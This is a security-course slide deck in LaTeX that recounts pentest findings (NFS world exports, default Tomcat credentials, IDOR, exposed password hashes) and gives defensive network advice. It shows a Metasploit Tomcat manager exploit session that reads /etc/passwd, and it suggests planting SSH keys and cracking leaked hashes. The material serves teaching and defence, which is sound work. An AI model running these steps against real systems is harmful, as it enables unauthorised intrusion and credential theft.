\item Today we would call this Google Dorks and IDOR, check out:\\ {\footnotesize
\url{https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html}}
\end{list2}

Hint: Do NOT put data under the web root, even though it may seem hidden

\slide{NFS World Export}

Unix has Networked File System (NFS), orignally from Sun Microsystems

Configured using an export file:
\begin{alltt}\footnotesize
/usr /usr/local -maproot=0:10 friends
/usr -maproot=daemon grumpy.cis.uoguelph.ca 131.104.48.16
/usr -ro -mapall=nobody
/u -maproot=bin: -network=131.104.48 -mask=255.255.255.0
/u2 -maproot=root friends
/u2 -alldirs -network=cis-net -mask=cis-mask
\end{alltt}
Example from \url{https://man.openbsd.org/exports.5}

\begin{list2}
\item Other systems mount these -- NFS server export, NFS client mount
\item Nice right! Except, if you leave out the hosts that can acces, everyone can access!
\item This is called export to the world
\end{list2}

\slide{Typical case}

%\hlkimage{}{}
Typically customers have these world exports -- with NFS or SMB

\begin{alltt}
hkj@kate:~/results$ showmount -e 172.16.0.2
Export list for 172.16.0.2:
/home/username1 *
/tftpboot *
/home/foo/root_fs *
/var/projects/myproject *
\end{alltt}

\begin{list2}
\item Not \emph{that bad} -- some directories are available
\item Maybe we can drop a public key in \verb+/home/username1/.ssh/authorized_keys+
\item Lots of personal Synology NAS boxes are on the internet, check Shodan
\end{list2}


\slide{Where's my backup dude - The Solaris servers }

So consider what happens if you test two servers, Solaris servers in a financial institution - high profile environment
\begin{list2}
\item Server 1 and server 2 are running Solaris
\item Pretty unhardened configuration
\item NFS is available, and server 2 has a \emph{world export}
\vskip 5mm
\item Of course we try mounting it
\item What is that?! It seems to be a complete backup of server1 available to everyone!
\end{list2}

Long story short, we found the password files from server1, found users without a password -- allowed direct login, we could crack other passwords -- and we gained access to both servers, since some passwords were the same

This is a strange case, because making backups is great, but leaving them lying around for anyone is bad


% * Hacking af Tomcat server
\slide{Tomcat in January 2022}

%\hlkimage{}{}

\begin{quote}
The Apache Tomcat® software is an open source implementation of the Jakarta Servlet, Jakarta Server Pages, Jakarta Expression Language, Jakarta WebSocket, Jakarta Annotations and Jakarta Authentication specifications. These specifications are part of the Jakarta EE platform.
\end{quote}
Source: \url{https://tomcat.apache.org/}

\begin{list2}
\item Well-known and used in many places to deploy Java applications, great
\item There are no default user, great
\end{list2}

Wait, why does this customer in Januart 2022 have a running version 7.0.68 with user tomcat/tomcat.

This version is from 2016 - so about 7-8 years old!

\slide{Solr January 2022 }

%\hlkimage{}{}
Same customer as before. Following software was identified
\begin{list2}
\item Apache Solr 4.10.1 was identified\\
According to the official web site for this software it was released in 2014! Release 4.10.1 [2014-09-28]
\item Zookeeper 3.4.10-39d3a4f269333c922ed3db283be479f9deacaa0f (Built on 03/23/2017)
\item WEBrick httpd 1.3.1 (Ruby 2.4.3 (2017-12-14))
\item Nginx 1.10.3 old and Nginx 10.15.10 release in 2019
Since some are from 2017 we consider the software outdated.
\end{list2}


\slide{Tomcat Manager with Default Metasploit hacking by pressing enter}

%\hlkimage{}{}

\begin{alltt}\scriptsize
msf > use exploit/multi/http/tomcat_mgr_upload

meterpreter > sysinfo
Computer    : solr4-prod-xxxxx.internal
OS          : Linux 4.15.0-1098-gcp (amd64)
Meterpreter : java/linux
meterpreter > shell
Process 1 created.
Channel 1 created.

whoami
tomcat7

id
uid=114(tomcat7) gid=118(tomcat7) groups=118(tomcat7)
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
\end{alltt}

\begin{list2}
    \item Gooooddammmit! Its easy being a hacker I used ready made Metasploit, tomcat modules and deployed my own application that allowed command line access to the server.

\end{list2}


\slide{Web Application Security }

%\hlkimage{}{}

We typically see:
\begin{list2}
\item Libraries in web applications not updated JQuery especially
\item TLS settings still have TLS version 1.0 and 1.1 enabled -- recommend only 1.2 and 1.3
\item Cookies without \verb+secure+ and -verb+http only+ flags -- easy to fix
\item SQL injections also still seen -- 2020/2021/2022
\item Old PHP versions seen PHP5 even! PHP7
\item Errors shown to the user -- helps an attacker prepare better requests
\end{list2}

Some of these can be identified by just running Nikto from Kali! Do it!

\slide{PHPMyAdmin password in text file older example}

Also seen in web application security testing:
\begin{list2}
\item File with passwords to the solution, helpful "I left the passwords in the web root folder"
\item Same server also had a nice debug.log in the root, with PHP errors so helpful for checking requests
\item Webserver with PHPMyAdmin
\begin{enumerate}
\item This admin tool for MySQL databases was on port 80
\item Then on port 8080 a nice file available with password
\item Return to port 80 with browser - access admin tool
\item Download database, {\bf took less than 10 minutes!}
\end{enumerate}
\end{list2}

\slide{Testing Web APIs 2024}

\verb+https://customerdomain.example.com/api/customer/v1/business/$ENDPPOINT+
ENDPOINT being something like: employeedocuments, clientcontacts, businessPropertyObjects, activities

\begin{list2}
\item    We love REST and the world does too
\end{list2}

\slide{REST Service Capability Granularity}

\hlkimage{12cm}{soabook-7-19-rest-service.png}

\begin{list2}
\item REST using HTTP has the standard HTTP methods available (e.g., GET, POST, PUT, DELETE);
\item See also \link{https://en.wikipedia.org/wiki/Representational_state_transfer}
\end{list2}
Source: {\footnotesize\\
\emph{Service‑Oriented Architecture: Analysis and Design for Services and Microservices}, Thomas Erl, 2017}




\slide{IDOR and Blobs 2024}

While scanning an API we found links to blob storage:
\begin{quote}
    Privat og konfidensielt Arbeidsavtale found\\
    \url{https://customer2storage.azureedge.net/customer-appid-1/Business-778/
EmployeeDetails-3815/2882_001-5.pdf}\\
and\\
Ansettelsesavtale \url{https://customer2storage.azureedge.net/customer-appid-1/Business-362/Employees-3463/
PrivateDocuments-122/ansettelsesdokumenterodd.pdf}
\end{quote}
Clearly confidential data

\begin{list2}
    \item Insecure Direct Object Reference with no authentication
    \item Recommend using \url{https://owasp.org/}, like:\\
    \url{https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html}
\end{list2}

\slide{Give Me AllUsers Unauthenticated -- pretty print please}

%\hlkimage{}{}

\begin{minted}[fontsize=\footnotesize]{js}
[{"Id": 18,
"LanguageId": 1,
"RoleId": 4,
"ApplicationId": 1,
"BusinessId": 8,
"Rights": "[{\"id\":\"1\",\"name\":\"ACTIVE_ACCOUNT\",\"isChecked\":true,\"rightsType\":1},
...
"Role": null,{\bf
"Password": "BJL...E=",}   // OMG PLEASE NO!!!!
"Mobile": null,
},
\end{minted}
Source: https://customerdomain.example.com/api/customer/v1/allusers

\begin{list2}
    \item
\end{list2}

\slide{}

%\hlkimage{}{}

\begin{alltt}
Identifying the hash is not conclusive, but was identified as:
BJL5Ffj...xSE= - Possible algorithms: Base64(unhex(SHA-256($plaintext)))

Checking how many we have:
$ jq . allusers.json | grep Password | wc -l
18282
\end{alltt}

\begin{list2}
\item Potential for cracking or verifying passwords, before attempting online brute-force attacks

\end{list2}



\slide{Keep Up to Date with technologies you use}

%\hlkimage{}{}

insert picture of Homer saying duh

\begin{quote}

\end{quote}

\begin{list2}
\item Make an effort
\item Be a professional
\end{list2}

Many definitions:
\begin{quote}
A {\bf professional} is a member of a profession or any person who works in a specified professional activity. The term also describes the {\bf standards of education and training} that prepare members of the profession with the {\bf particular knowledge and skills} necessary to perform their {\bf specific role} within that profession. In addition, most professionals are subject to {\bf strict codes of conduct}, enshrining {\bf rigorous ethical and moral obligations}.[1] Professional standards of practice and {\bf ethics} for a particular field are typically agreed upon and maintained through widely recognized professional associations, such as the IEEE.[2]
\end{quote}
Source: \url{https://en.wikipedia.org/wiki/Professional}

\begin{list2}
\item The field of IT has a lot of amateurs
\item Sorry if this sound elitist, but we should take responsebility not only for ourselves but for our communities
\end{list2}

\slide{What you don't know can hurt you}

Problem: You send personal data -- GDPR\\
You want to have it ALL encrypted, but SMTP does NOT require encryption -- or does it?!
%\hlkimage{}{}

\vskip 1cm

\begin{quote}\footnotesize
The SMTP protocol isn’t secure and wasn’t designed to be. Email sent in the early days of the Internet were the digital equivalent of sending a postcard through the postal system. Eventually, Transport Layer Security (TLS) encryption was added to protect SMTP communications. But to maintain backward compatibility, it was never made compulsory and even today it’s used only opportunistically by senders.

...

The SMTP MTA Strict Transport Security (MTA-STS) standard was developed to ensure that TLS is always used, and to provide a way to for sending servers to refuse to deliver messages to servers that don’t support TLS and have a trusted certificate. The MTA-STS standard was developed by several email industry companies brought together by the Messaging, Malware and Mobile Anti-Abuse Working Group (M3AAWG). We have been validating our implementation and are now pleased to announce support for MTA-STS for all outgoing messages from Exchange Online.
\end{quote}
Source:\\
 {\scriptsize\url{https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386}}

\begin{list2}
\item \url{https://en.wikipedia.org/wiki/Opportunistic_encryption}
\item Just an example, make sure to read up on RPKI, DNSSEC, DMARC, DANE, DKIM, TLS, ...
\end{list2}


\slide{Hackers don't give a shit}

Your system is only for testing, development, ...

Your network is a research network, under construction, \\
being phased out, ...

Try something new, go to your management

Bring all the exceptions, all of them, update the risk \\
analysis figures - if this happens it is about 1mill DKK

Ask for permission to go full monty on your security

{\bf Think like attackers - don't hold back}


\hlkimage{10cm}{kiwicon-2009-hackers-dont-give-shit.jpg}


\slide{Advice for enterprise networks}


\begin{list2}
\item Portscanning - start using portscans in your networks, verify how far malware and hackers can travel, and identify soft systems needing updates or isolation
\item Have separation -- anywhere, starting with organisation units, management networks, server networks, customers, guests, LAN, WAN, Mail, web, ...
\item Use Web proxies - do not allow HTTP directly except for a short allow list, \\
do not allow traffic to and from any new TLD
\item Use only your own DNS servers, create a pair of Unbound servers, \\
point your internal DNS running on Windows to these\\
Create filtering, logging, restrictions on these Unbound DNS servers\\
\link{https://www.nlnetlabs.nl/projects/unbound/about/} and also \link{https://pi-hole.net/}
\item Only allow SMTP via your own mail servers, create a simple forwarder if you must
\end{list2}

Allow lists are better than block list, even if it takes some time to do it

\myquestionspage


\slide{Books and educational materials}

\begin{list2}
\item \emph{The Linux Command Line: A Complete Introduction}, 2nd Edition\\
 by William Shotts, internet edition \link{https://sourceforge.net/projects/linuxcommand}
\item \emph{Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali}. OccupyTheWeb, December 2018, 248 pp. ISBN-13: 978-1-59327-855-7
\item \emph{Gray Hat Hacking: The Ethical Hacker's Handbook}, 5. ed. Allen Harper and others ISBN: 978-1-260-10841-5
\item \emph{Web Application Security}, Andrew Hoffman, 2020, ISBN: 9781492053118
\item \emph{Practical Packet Analysis, Using Wireshark to Solve Real-World Network Problems}
by Chris Sanders, 3rd ed, ISBN: 978-1-59327-802-1
\item \emph{Hacking, 2nd Edition: The Art of Exploitation}, Jon Erickson, February 2008, ISBN-13: 9781593271442
\item \emph{Kali Linux Revealed Mastering the Penetration Testing Distribution}\\
\link{https://www.kali.org/}
\end{list2}


We teach using these books and others! Diploma in IT-security at KEA Kompetence\\
 \link{https://zencurity.gitbook.io/}


\slide{Capture data and logs!}


\begin{list2}
\item Run DNS query logs -- when client1 is infected with malware from domain malwareexample.com, then search for more clients i
nfected
\item Run Zeek and gather information about all HTTPS sessions -- captures certificates by default, and we can again search for
certificate related to malwareexample.com
\item Run network logging -- session logs in enterprise networks are GREAT \\
(country wide illegal logging is of course NOT)
\end{list2}

Make sure to check with employees, inform them!

\slide{DROP SOME TRAFFIC NOW}

\begin{list2}
\item Drop some traffic on the border of everything
\item Seriously do NOT allow Windows RPC across borders
\item Border here may be from regional country office back to HQ
\item Border may be from internet to internal networks
\item Block Windows RPC ports, 135, 137, 139, 445
\item Block DNS directly to internet, do not allow clients to use any DNS, fake 8.8.8.8 if you must internally
\item Block SMTP directly to internet
\item Create allow list for internal networks, client networks should not contact other client networks but only relevant server networks
\end{list2}

You DONT need to allow direct DNS towards internet, except from your own recursive DNS servers

If you get hacked by Windows RPC in 2022, you probably deserve it, sorry for being blunt

Best would be to analyze traffic and create allow lists, some internal networks to not need internet at all


\slide{Default permit}

%\hlkimage{}{}

One of the early implementers of firewalls Marcus J. Ranum summarized in 2005 The Six Dumbest Ideas in Computer Security \link{https://www.ranum.com/security/computer_security/editorials/dumb/} which includes the always appropriate discussion about default permit versus default deny.

\begin{quote}\small {\bf
\#1) Default Permit}\\
This dumb idea crops up in a lot of different forms; it’s incredibly persistent and difficult to eradicate. Why? Because it’s so attractive. Systems based on ”Default Permit” are the computer security equivalent of empty calories: tasty, yet fattening.

The most recognizable form in which the ”Default Permit” dumb idea manifests itself is in firewall rules. Back in the very early days of computer security, network managers would set up an internet connection and decide to secure it by turning off incoming telnet, incoming rlogin, and incoming FTP. Everything else was allowed through, hence the name ”Default Permit.” This put the security practitioner in an endless arms-race with the hackers.
\end{quote}


\begin{list2}
\item Allow all current networks today on all ports for all protocols \emph{is} an allow list \\
Which tomorrow can be split into one for TCP, UDP and remaining, and measured upon
\item Measure, improve, repeat
\end{list2}



\slide{We cannot do X}

\begin{quote}
We cannot block SMTP from internal networks, since we do not know for sure if vendor X equipment needs to send the MOST important email alert at some unspecific time in the future
\end{quote}

Cool, then we can do an allow list starting today on our border firewall:
\begin{alltt}
table <smtp-exchange> \{ $exchange1 $exchange2 $exchange3 \}
table <smtp-unknown> persist file "/firewall/mail/smtp-internal-unknown.txt"
# Regular use, allowed
pass out on egress inet proto tcp from smtp-echange to any port 25/tcp
# Unknown, remove when phased out
pass out on egress inet proto tcp from smtp-internal to any port 25/tcp
\end{alltt}

Year 0 the unknown list may be 100\% of all internal networks, but new networks added to infrastructure are NOT added, so list will shrink -- evaluate the list, and compare to network logs, did networks send ANY SMTP for 1,2,3 years?

\slide{Zeek is a framework and platform}

\hlkimage{12cm}{zeek-ids.png}

\begin{quote}
While focusing on network security monitoring, Zeek provides a comprehensive platform for more general network traffic analysis as well. Well grounded in more than 15 years of research, Zeek has successfully bridged the traditional gap between academia and operations since its inception.
\end{quote}

\link{https://www.Zeek.org/}
Does useful things out of the box using more than 10.000 script lines

\slide{Suricata IDS/IPS/NSM}
\hlkimage{6cm}{suricata.png}

\begin{quote}
Suricata is a high performance Network IDS, IPS and Network Security Monitoring engine.
\end{quote}

 \link{http://suricata-ids.org/}
 \link{http://openinfosecfoundation.org}

Suricata, Zeek og DNS Capture -- it a nice world, use it!\\
{\small\link{https://github.com/kramse/security-courses/tree/master/courses/networking/suricatazeek-workshop}}



\slide{Firewall -- Another definition}

% Remove?
I am also fond of this longer and technical definition from RFC4949:
\begin{quote}
\$ firewall

      1. (I) {\bf An internetwork gateway that restricts data communication
      traffic to and from one of the connected networks} (the one said to
      be "inside" the firewall) and thus protects that network's system
      resources against threats from the other network (the one that is
      said to be "outside" the firewall). (See: guard, security
      gateway.)

      2. (O) {\bf A device or system that controls the flow of traffic
      between networks using differing security postures.} Wack, J. et al (NIST), "Guidelines on Firewalls and Firewall Policy", Special Publication 800-41,
      January 2002.

      Tutorial: A firewall typically protects a smaller, secure network
      (such as a corporate LAN, or even just one host) from a larger
      network (such as the Internet). The firewall is installed at the
      point where the networks connect, and the firewall applies policy
      rules to control traffic that flows in and out of the protected
      network.
\end{quote}

\slide{Firewall -- Another definition}
% Remove?
\begin{quote}
\$ firewall, continued

      {\bf A firewall is not always a single computer.} For example, a
      firewall may consist of a pair of filtering routers and one or
      more proxy servers running on one or more bastion hosts, all
      connected to a small, dedicated LAN (see: buffer zone) between the
      two routers.

      The external router blocks attacks that use IP to
      break security (IP address spoofing, source routing, packet
      fragments), while proxy servers block attacks that would exploit a
      vulnerability in a higher-layer protocol or service. The internal
      router blocks traffic from leaving the protected network except
      through the proxy servers.

      The difficult part is defining criteria by which packets are denied passage through the firewall, because
      a firewall not only needs to keep unauthorized traffic (i.e., intruders) out, but usually also needs to let authorized traffic
      pass both in and out.
\end{quote}


\slide{Routing Security}


\begin{list2}
\item Use MD5 passwords or better authentication for routing protocols {\myalert}
\item TTL Security -- avoid routed packets
\item Max prefix -- of course, only allow expected networks
\item Prefix filtering -- only parts of IPv6 space is used
\item TCP Authentication Option [RFC 5925] replaces TCP MD5 [RFC 2385]
\item Turn ON RPKI for both IPv4 and IPv6 prefixes, {\myalert} \\
\link{https://nlnetlabs.nl/projects/rpki/about/}
\item Drop bogons on IPv4 and IPv6, article with multiple references YMMV\\
\link{https://theinternetprotocolblog.wordpress.com/2020/01/15/some-notes-on-ipv6-bogon-filtering/}
\end{list2}


\slide{Mutually Agreed Norms for Routing Security (MANRS)}

%\hlkimage{2cm}{MANRS_square.png}

\begin{quote}
  Mutually Agreed Norms for Routing Security (MANRS) is a global initiative, supported by the Internet Society, that provides crucial fixes to reduce the most common routing threats. ﻿
\end{quote}
Source: {\small\link{https://www.manrs.org/wp-content/uploads/2018/09/MANRS_PDF_Sep2016.pdf}}

\begin{list2}
\item Problems related to incorrect routing information
\item Problems related to traffic with spoofed source IP addresses
\item Problems related to coordination and collaboration between network operators
\item Also BCP38 RFC2827 \emph{Network Ingress Filtering: Defeating Denial of Service Attacks
which employ IP Source Address Spoofing}
\end{list2}

You should all ask your internet providers if they know about MANRS, and follow it. We should ask our government and institutions to support and follow MANRS and good practices for network on the Internet



\end{document}
